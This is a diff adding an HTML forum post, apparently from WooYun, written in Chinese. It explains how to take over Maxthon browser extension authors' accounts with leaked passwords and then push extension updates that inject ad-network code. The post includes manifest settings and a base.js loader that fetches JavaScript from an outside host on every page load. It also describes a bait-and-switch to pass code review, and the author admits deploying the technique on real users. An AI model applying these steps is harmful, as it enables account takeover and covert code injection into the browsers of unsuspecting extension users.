@@ -1,0 +1,35 @@
+<p class="topicDetail"> 广告联盟应该都听说过，那有没有听说过不入侵的方式来大规模部署广告代码呢，接下来就是方法：
+<br>玩过XSS的人应该都知道，让用户执行JavaScript才是最高命令。但是终不能一个个挖吧。而且挖到储蓄型的XSS，也很容易被修复。而且只能操作那一个页面，特别的蛋碎。但是如果用插件的形式呢（关于插件安全我说了很多次，但就是没人关注。可能是长的丑的问题吧。）
+<br>之前在freebuf说过插件安全：http://www.freebuf.com/articles/web/61268.html 0x02章节。
+<br>之前说的是控制插件第三方JavaScript的API接口。但是要分析代码，还要入侵，太麻烦了。今天想到一个好的方法。
+<br>控制插件作者的账户，更新插件。在插件里部署上广告代码。就那么简单。先来看看我是怎么做的吧：
+<br>我几年前加了maxthon插件作者群：
+<br><a title="1.png" href="http://static.wooyun.org/upload/image/201603/2016032821053938479.png" target="_blank"><img alt="1.png" src="http://static.wooyun.org/upload/image/201603/2016032821053938479.png"></a>
+<br>278人都是遨游浏览器插件作者，而遨游浏览器登的机制是：邮箱-密码。
+<br>我只需要在群里随便抽一个人，在社工库里查询是否有对应的密码，再到https://my.maxthon.cn/recover.html验证此人的邮箱是否为：QQ号@qq.com，就行了。如果邮箱错误的话，会提示：
+<br><a title="1.png" href="http://static.wooyun.org/upload/image/201603/2016032821101784744.png" target="_blank"><img width="640" alt="1.png" src="http://static.wooyun.org/upload/image/201603/2016032821101784744.png"></a>
+<br>这里使用的是ajax，可以写个脚本自动判断。
+<br>当我抽到第6个人的时候，成功了（恭喜你，被选为幸运用户）。
+<br>为了安全起见，这里就不透露出那个作者的QQ了。
+<br><a title="1.png" href="http://static.wooyun.org/upload/image/201603/2016032821183423794.png" target="_blank"><img width="640" alt="1.png" src="http://static.wooyun.org/upload/image/201603/2016032821183423794.png"></a>
+<br>接下来，看看他上传了哪些插件吧：
+<br><a title="1.png" href="http://static.wooyun.org/upload/image/201603/2016032821195132731.png" target="_blank"><img width="640" alt="1.png" src="http://static.wooyun.org/upload/image/201603/2016032821195132731.png"></a>
+<br>723和用户，挺nice的。
+<br>这里有个窍门，怎么找到下载后插件的位置：
+<br>点击安装，会出现一个对话框，迅速截图：
+<br><a title="1.png" href="http://static.wooyun.org/upload/image/201603/2016032821220294086.png" target="_blank"><img alt="1.png" src="http://static.wooyun.org/upload/image/201603/2016032821220294086.png"></a>
+<br>会看到文件名，使用everything搜索就行了，再使用遨游官网提供的软件，来把插件解包：
+<br><a title="1.png" href="http://static.wooyun.org/upload/image/201603/2016032821234635525.png" target="_blank"><img alt="1.png" src="http://static.wooyun.org/upload/image/201603/2016032821234635525.png"></a>
+<br>接下来就是改代码，上传的步骤了：
+<br>在def.json里，记得把type的值设置为script。entryPoints的值设置为doc_onload。再在actions对象中添加js脚本文件，类似下面这样：
+<br><a title="1.png" href="http://static.wooyun.org/upload/image/201603/2016032821255342594.png" target="_blank"><img alt="1.png" src="http://static.wooyun.org/upload/image/201603/2016032821255342594.png"></a>
+<br>你更新插件的时候，遨游工作人员会查看你的代码，所有这里我使用了加载第三方js文件，第三方js文件里才是广告联盟的代码。在审核通过之前第三方js文件，要保证无毒无害绿色健康无污染。为空也行。当审核通过后，再改成广告联盟的代码就行了。
+<br>我的base.js里的内容是：
+<br><code>var javascript = document.createElement('script');
+<br>javascript.src = "http://1.addtess.applinzi.com/pages-commond.js";
+<br>document.body.appendChild(javascript);</code>
+<br>http://1.addtess.applinzi.com/pages-commond.js才是真正的代码，切记审核通过前要保持为空，或者无害的代码。当审核通过后再改回来。
+<br>修改后，在使用MxPacker封装成插件就行了。
+<br><a title="1.png" href="http://static.wooyun.org/upload/image/201603/2016032821310150063.png" target="_blank"><img width="640" alt="1.png" src="http://static.wooyun.org/upload/image/201603/2016032821310150063.png"></a>
+<br>之前在乌云发布的“自动优化乌云网站，随时更新http://zone.wooyun.org/content/26143”的帖子，大家也懂得。26个人下载了，如果你安装了，请删除，如果还是想要那个功能的话，你自己重新写一个插件吧，不难 
+                    </p>
